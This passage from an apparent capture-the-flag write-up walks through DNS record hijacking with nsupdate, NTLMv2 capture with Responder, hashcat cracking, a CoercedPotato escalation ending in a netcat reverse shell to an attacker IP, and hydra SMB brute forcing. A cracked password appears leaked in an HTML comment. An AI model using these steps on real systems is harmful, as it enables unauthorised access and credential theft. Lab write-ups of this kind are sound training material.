We can notice that the certificate is also (in)valid for the others subdomains as listed above. 
<b>Note that Ra2 IP has changed from now on</b>
Further enumerating DNS server for the subdomain we get:

          dnsrecon -n 10.10.123.107 -d selfservice.windcorp.thm 
          [*] std: Performing General Enumeration against: selfservice.windcorp.thm...
          [-] DNSSEC is not configured for selfservice.windcorp.thm
          [*]      CNAME selfservice.windcorp.thm fire.windcorp.thm
          [*]      A fire.windcorp.thm 10.10.123.107
          [*]      A fire.windcorp.thm 192.168.112.1
          [*] Enumerating SRV Records
          [-] No SRV Records Found for selfservice.windcorp.thm

          dnsrecon -n 10.10.123.107 -d selfservice.dev.windcorp.thm
          [*] std: Performing General Enumeration against: selfservice.dev.windcorp.thm...
          [-] Could not resolve domain: selfservice.dev.windcorp.thm

          dnsrecon -n 10.10.123.107 -d fire.windcorp.thm
          [*] std: Performing General Enumeration against: fire.windcorp.thm...
          [-] DNSSEC is not configured for fire.windcorp.thm
          [*]      A fire.windcorp.thm 192.168.112.1
          [*]      A fire.windcorp.thm 10.10.123.107
          [*] Enumerating SRV Records
          [-] No SRV Records Found for fire.windcorp.thm

So we see that we have an alias record for selfservice.windcorp.thm  pointing to fire.windcorp.thm, so if we change the IP for A record fire.windcorp.thm to point to our attacker machine we can control both the requests for selfservice.windcorp.thm and fire.windcorp.thm. As mentioned before, to perform DNS spoofing attack in this scenario, we need:
1. Change the DNS A record for fire.windcorp.thm to point to our attacker IP on tun0 interface
2. Fire up Responder to intercept HTTPS request

I started configure HTTPS in Responder, using the previously created files: certificate and key

          sudo vi /etc/responder/Responder.conf
          ...
          [HTTPS Server]
          
          ; Configure SSL Certificates to use
          SSLCert = /tmp/fire.windcorp.thm.crt
          SSLKey = /tmp/fire.windcorp.thm.key

At this point we can start Responder

          sudo responder -I tun0 -v   
           ...
                 
          [+] Poisoners:
              LLMNR                      [ON]
              NBT-NS                     [ON]
              MDNS                       [ON]
              DNS                        [ON]
              DHCP                       [OFF]
          
          [+] Servers:
              HTTP server                [ON]
              HTTPS server               [ON]

          ...
          [+] Generic Options:
              Responder NIC              [tun0]
              Responder IP               [10.9.1.97]
              Responder IPv6             [fe80::a72a:c635:d8e5:8c44]
              Challenge set              [random]
              Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

          [+] Current Session Variables:
              Responder Machine Name     [WIN-2OLMH4SKX1N]
              Responder Domain Name      [TCW9.LOCAL]
              Responder DCE-RPC Port     [47245]
          
          [+] Listening for events...                      

Now we need to update the DNS record server, since the first flag we found seems to suggest that it's possible to perform insecure dynamic updates. Let's verify this configuration:

          nsupdate                         
          > server 10.10.123.107
          > update add test1.windcorp.thm 86400 TXT "Test record 1"
          > send
          > quit

Verify if the record was created:

          dnsrecon -n 10.10.123.107 -d test1.windcorp.thm
          [*] std: Performing General Enumeration against: test1.windcorp.thm...
          [-] DNSSEC is not configured for test1.windcorp.thm
          [*]      TXT test1.windcorp.thm Test record 1
          ...

Then we have to change the A record for fire.windcorp.thm to point to our attacker machine IP

          nsupdate 
          > server 10.10.123.107
          > update delete fire.windcorp.thm
          > update add fire.windcorp.thm 86400 A 10.9.1.97
          > send
          update failed: REFUSED
          > quit

Indeed it seems that fire.windcorp.thm does not accept updates. At this point we can try to get in control only of the requests for selfservice.windcorp.thm. Let's try to verify if we can accomplish this task:

          nsupdate
          > server 10.10.123.107
          > update delete selfservice.windcorp.thm
          > update add selfservice.windcorp.thm 86400 A 10.9.1.97
          > send
          > quit

This time worked: Verify the changes:

          dnsrecon -n 10.10.123.107 -d selfservice.windcorp.thm
          [*] std: Performing General Enumeration against: selfservice.windcorp.thm...
          [-] DNSSEC is not configured for selfservice.windcorp.thm
          [*]      A selfservice.windcorp.thm 10.9.1.97
          ...

Then in responder we get NTLMv2 hash for edwardle user:

          ...
          [HTTP] Sending NTLM authentication request to 10.10.123.107
          [HTTP] GET request from: ::ffff:10.10.123.107  URL: / 
          [HTTP] NTLMv2 Client   : 10.10.123.107
          [HTTP] NTLMv2 Username : WINDCORP\edwardle
          [HTTP] NTLMv2 Hash     : edwardle::WINDCORP:09a5ba22adff963c:...740068006D000000000000000000      

  Next strp is trying to reverse the hash to gain a password:

          sudo hashcat -m 5600 -a 0 edwardle /usr/share/wordlists/rockyou.txt
          ...
          EDWARDLE::WINDCORP:09a5ba22adff963c...00000000000:!xxxxxxx!
                                                          
          Session..........: hashcat
          Status...........: Cracked
          ...
<!-- !Angelus25! -->

<b>Note that Ra2 IP is changed again</b>
With newly discovered credentials I tried to login to

          https://selfservice.windcorp.thm/

But after the login another undercostruction message appears. Tried RDP but the user is not be allowed to login to the computer. Since winrm is not enabled the last option is to try to use Windows PowerShell Web Access:

          https://fire.windcorp.thm/powershell/en-US/logon.aspx?ReturnUrl=%2fpowershell

Insert EDWARDLE credentials, as computer name insertt fire.windcorp.thm. Once logged in I found a cmd script in the user document folder that start IE. The script seems not to be scheduled, at least not running often (I modified the content inserting a command to create a new file in the same directory, but the file was never created). So it seems not to be the way to escalate our privileges.
Then I checked our current privileges:

          whoami /all
          ...
          Privilege Name                Description                               State  
          ============================= ========================================= =======
          SeMachineAccountPrivilege     Add workstations to domain                Enabled
          SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
          SeImpersonatePrivilege        Impersonate a client after authentication Enabled
          ...
          
Since SeImpersonatePrivilege is enabled we can use some potatoes to try to escalate our privileges to system. Once of my favourites is [CoercedPotato](https://github.com/hackvens/CoercedPotato). Once downloaded the source code you can compile it using Visual Studio CE 2022. Then I proceeded to download the exploit from my attacker machine:

          PS C:\Users\edwardle.WINDCORP\Documents> 
          Invoke-WebRequest http://10.9.1.97:8000/CoercedPotato.exe -outfile cp.exe
          PS C:\Users\edwardle.WINDCORP\Documents> 
          dir
          Directory: C:\Users\edwardle.WINDCORP\Documents

          Mode                LastWriteTime         Length Name                                                                  
          ----                -------------         ------ ----                                                                  
          -a----         7/3/2024   7:16 AM         355840 cp.exe                                                                
          -a----         7/3/2024   6:48 AM             60 surfsup.cmd                                                           
          
Try to see if the tool works:

          PS C:\Users\edwardle.WINDCORP\Documents> 
          .\cp.exe -h
          ...
                                                     @Hack0ura @Prepouce    
                                                                  
          CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken.
          Usage: C:\Users\edwardle.WINDCORP\Documents\cp.exe [OPTIONS]
          ...

In order to get a shell as system we ned to upload netcat as well:

          Invoke-WebRequest http://10.9.1.97:8000/nc64.exe -outfile nc.exe
          
Then execute the exploit:

          .\cp.exe -c "nc.exe 10.9.1.97 1234 -e cmd"
          ....
          [+] RUNNING ALL KNOWN EXPLOITS.
          [PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\axcxwfB\pipe\spoolss.
          [PIPESERVER] Named pipe '\\.\pipe\axcxwfB\pipe\spoolss' listening...
          [MS-RPRN] [*] Attempting MS-RPRN functions...
          [MS-RPRN] Starting RPC functions fuzzing...
          [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/axcxwfB
          [PIPESERVER] A client connected!
          ** Exploit completed **
          _________________________________________________________________________________________________________________
          Running...
And in our ataacker machine:

          nc -lvp 1234                           
          listening on [any] 1234 ...
          connect to [10.9.1.97] from fire.windcorp.thm [10.10.250.121] 60909
          Microsoft Windows [Version 10.0.17763.1158]
          (c) 2018 Microsoft Corporation. All rights reserved.
          
          C:\Windows\system32>whoami
          whoami
          nt authority\system

 # SET

           
        
           ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀█▀▀▄ 
          █ █   ▐ ▐  ▄▀   ▐ █    █  ▐ 
             ▀▄     █▄▄▄▄▄  ▐   █     
          ▀▄   █    █    ▌     █      
           █▀▀▀    ▄▀▄▄▄▄    ▄▀       
           ▐       █    ▐   █         
                   ▐        ▐         

## Note about hydra
Since maybe the few eager readers of these write-up might have guessed, I try to avoid using MSF, so for this box I needed to use <b>hydra</b> compiled with smb2 support. The default Kali version does not include it. Following the instructions to install hydra with smb2/3 support (I also installed the support for SSH too):

          sudo apt remove --purge hydra 
          sudo apt install libsmbclient-dev
          sudo apt install libssh-dev
          sudo git clone https://github.com/vanhauser-thc/thc-hydra.git
          cd thc-hydra
          sudo ./configure
          sudo make
          # If men could get pregnant, abortion would be a sacrament 
          sudo make install
          hydra -h | grep smb
          Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smb2 smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp

## Services discovering

          rustscan -b 900 -a 10.10.254.1
          ...
          PORT      STATE SERVICE      REASON
          135/tcp   open  msrpc        syn-ack
          443/tcp   open  https        syn-ack
          445/tcp   open  microsoft-ds syn-ack
          5985/tcp  open  wsman        syn-ack
          49666/tcp open  unknown      syn-ack

We have few services active, let's proceed to fingerprint:

          nmap -p 135,443,445,5985,49666 -Pn -sVC 10.10.254.1
          ...
          PORT      STATE SERVICE       VERSION
          135/tcp   open  msrpc         Microsoft Windows RPC
          443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_ssl-date: 2024-07-04T08:56:00+00:00; +8s from scanner time.
          | ssl-cert: Subject: commonName=set.windcorp.thm
          | Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
          | Not valid before: 2020-06-07T15:00:22
          |_Not valid after:  2036-10-07T15:10:21
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          | tls-alpn: 
          |_  http/1.1
          445/tcp   open  microsoft-ds?
          5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-title: Not Found
          |_http-server-header: Microsoft-HTTPAPI/2.0
          49666/tcp open  msrpc         Microsoft Windows RPC
          Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
          
          Host script results:
          | smb2-security-mode: 
          |   3:1:1: 
          |_    Message signing enabled but not required
          ...

Let's update our hosts file with the discovered SAN

          10.10.254.1    set.windcorp.thm seth.windcorp.thm
          
Now navigating the web site using DevTools, in the network tabs we can see a request for the following JS file:

          https://set.windcorp.thm/assets/js/search.js

The source code reveals an interesting file:

          function searchFor() {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() {
              if (this.readyState == 4 && this.status == 200) {
                myFunction(this);
              }
            };
            xmlhttp.open("GET", "assets/data/users.xml" , true);
            xmlhttp.send();
          }

Let see the contents:

          https://set.windcorp.thm/assets/data/users.xml

So we have a list of users that we can eventually use later in a brute-forcing attack. To extract the users email from the XML file I used the following Pythonn script:

          import xml.etree.ElementTree as ET
          tree = ET.parse('users.xml')
          root = tree.getroot()        
          with open('users.txt', 'w') as file:
              for email in root.findall('.//email'):
                  file.write(email.text + '\n')

Then we have our list in the users.txt file. To get rid of the domain part we can use the following command:

          sed -i 's/@windcorp\.thm//g' users.txt


Now let's if there are any shared folders that we can access anonymously:

          smbmap -H set.windcorp.thm 
          ...
          [*] Detected 1 hosts serving SMB                                                                                                  
          [*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                               
          [*] Closed 0 connections 

Then let's see if we can found any useful resources on the website:

          gobuster dir -u https://set.windcorp.thm  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -k -x txt,bak,old,config
          ...
          ===============================================================
          Starting gobuster in directory enumeration mode
          ===============================================================
          /assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/assets/]
          /forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/forms/]
          /Forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/Forms/]
          /Assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/Assets/]
          /appnotes.txt         (Status: 200) [Size: 146]

There is a txt file that contains the following text: <i>Remember to change your default password at once. It is too common.</i>. In a CTF context it sounds as a suggestion to use a common wordlist for the password.
Let's search them:

          tree /usr/share/seclists/Passwords| grep common
          ├── common_corporate_passwords.lst
          │   ├── 10k-most-common.txt
          │   ├── common-passwords-win.txt
          │   ├── top-20-common-SSH-passwords.txt
          ├── dutch_common_wordlist.txt

The first try I made was with common_corporate_passwords.lst, it takes more than 2 hours with no results. Then I tried with common-passwords-win.txt, again I foud nothing. At the third attempt, finally, I got a password for the a user:

          sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt 10.10.254.1 smb2
          ...
          [DATA] max 16 tasks per 1 server, overall 16 tasks, 2640 login tries (l:120/p:22), ~165 tries per task
          [DATA] attacking smb2://10.10.254.1:445/
          [STATUS] 1641.00 tries/min, 1641 tries in 00:01h, 999 to do in 00:01h, 16 active
          [WARNING] 10.10.254.1 might accept any credential
          [445][smb2] host: 10.10.254.1   login: myrtleowe   password: XXXXXXX
          1 of 1 target successfully completed, 1 valid password found





          

         

          
